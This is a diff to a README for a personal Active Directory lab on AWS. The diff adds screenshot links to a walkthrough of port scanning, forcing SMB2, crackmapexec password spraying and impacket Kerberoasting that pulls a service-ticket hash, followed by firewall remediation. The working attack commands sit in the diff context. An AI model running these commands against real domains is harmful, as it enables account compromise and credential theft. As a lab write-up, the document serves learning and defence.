@@ -182,6 +182,7 @@ To keep the project cost-safe, I used another Windows Server as the “client.�
 * Windows Server 2022 Base
 * t3.micro
 * 30GB storage
+![Launch, Domain Member](https://i.imgur.com/O9x2EwZ.png)
 
 ### 2) Set Client DNS to DC IP
 
@@ -198,13 +199,15 @@ Test:
 ping <DC_PRIVATE_IP>
 nslookup corp.local
 ```
-
+![Setting Up Domain Member](https://i.imgur.com/vFwOfeL.png)
 ✅ Ping + DNS resolution worked.
 
 ### 3) Join Domain
 
 * sysdm.cpl → Computer Name → Change → Domain: corp.local
 * Auth: `corp\Administrator`
+
+![Joining domain](https://i.imgur.com/VQuFNMA.png)
 
 Reboot.
 
@@ -228,7 +231,7 @@ Attacker machine: **Local Kali VM** (outside AWS)
 ```bash
 nmap -sS -Pn -p 88,389,445,3389 <DC_PUBLIC_IP>
 ```
-
+![Recon With Kali](https://i.imgur.com/KD12oKc.png)
 ✅ Result: all ports open (misconfiguration state confirmed)
 
 ---
@@ -244,6 +247,8 @@ nmap --script smb-os-discovery -p 445 <DC_PUBLIC_IP>
 ```
 
 It appeared “filtered” even though port 445 was “open” on basic scans.
+
+![Filtered Scan](https://i.imgur.com/Xf9T26z.png)
 
 This was a useful lesson:
 
@@ -261,6 +266,8 @@ Fix: force SMB2 (modern Windows Server requires SMB2/SMB3).
 smbclient -L //<DC_PUBLIC_IP>/ -U jsmith --option='client min protocol=SMB2'
 ```
 
+![Force SMB2](https://i.imgur.com/zKZoEku.png)
+
 ### 3) Password spray simulation
 
 Used known weak passwords (lab-created accounts).
@@ -269,10 +276,11 @@ Result: successful authentication for users where the password was correct.
 (Example testing approach)
 
 ```bash
-crackmapexec smb <DC_PUBLIC_IP> -u jsmith -p Password123!
-crackmapexec smb <DC_PUBLIC_IP> -u mturner -p Password123!
-crackmapexec smb <DC_PUBLIC_IP> -u abrown  -p Password123!
+crackmapexec smb <DC_PUBLIC_IP> -u cmark -p Password123!
+crackmapexec smb <DC_PUBLIC_IP> -u dbenz -p Password123!
 ```
+![Password Reuse](https://i.imgur.com/rqk1Vtg.png)
+![Password Reuse](https://i.imgur.com/e33Vg29.png)
 
 ✅ Demonstrated how weak password reuse increases blast radius.
 
@@ -285,7 +293,7 @@ crackmapexec smb <DC_PUBLIC_IP> -u abrown  -p Password123!
 ```bash
 impacket-GetUserSPNs corp.local/jsmith:Password123! -dc-ip <DC_PUBLIC_IP>
 ```
-
+![Enumerate SPNs](https://i.imgur.com/vEpjjJH.png)
 ✅ Saw svc-sql in the results.
 
 ### 2) Request Kerberos service ticket (hash extraction)
@@ -293,7 +301,7 @@ impacket-GetUserSPNs corp.local/jsmith:Password123! -dc-ip <DC_PUBLIC_IP>
 ```bash
 impacket-GetUserSPNs corp.local/jsmith:Password123! -dc-ip <DC_PUBLIC_IP> -request
 ```
-
+![Enumerate SPNs](https://i.imgur.com/cF3i0lZ.png)
 ✅ Output included a `$krb5tgs$...` hash (Kerberoastable).
 
 This proved:
@@ -313,6 +321,8 @@ On **DC Security Group**, removed external access for:
 * 445 (SMB)
 * 389 (LDAP)
 * 88 (Kerberos)
+* 
+![DC Security](https://i.imgur.com/7SyTf1d.png)
 
 Kept:
 
@@ -331,6 +341,7 @@ nmap -sS -Pn -p 88,389,445,3389 <DC_PUBLIC_IP>
 * 445 filtered
 * 3389 open
 
+![Re-test](https://i.imgur.com/tspKKbF.png)
 Remediation verified.
 
 ---
@@ -372,28 +383,6 @@ Fix:
 ```bash
 smbclient -L //<DC_PUBLIC_IP>/ -U jsmith --option='client min protocol=SMB2'
 ```
-
----
-
-# Screenshots / Evidence
-
-I captured evidence at each stage. Recommended screenshot names:
-
-1. `01-aws-vpc-subnet-route.png`
-2. `02-dc-running-rdp.png`
-3. `03-ad-ds-installed.png`
-4. `04-users-created.png`
-5. `05-setspn-verified.png`
-6. `06-nmap-exposed-ports.png`
-7. `07-smbclient-smb2-success.png`
-8. `08-password-spray-success.png`
-9. `09-getuserspns-svc-sql.png`
-10. `10-kerberoast-hash.png`
-11. `11-remediation-security-group.png`
-12. `12-nmap-after-remediation.png`
-
-> Put screenshots in a `/screenshots` folder and reference them in this README like:
-> `![caption](screenshots/06-nmap-exposed-ports.png)`
 
 ---
 
@@ -468,7 +457,5 @@ Now that initial access + Kerberoast hash extraction is proven, the next phase i
 
 This project was conducted in a controlled lab environment on systems I own and configured for testing.
 No unauthorized systems were targeted.
-
-```
 
 
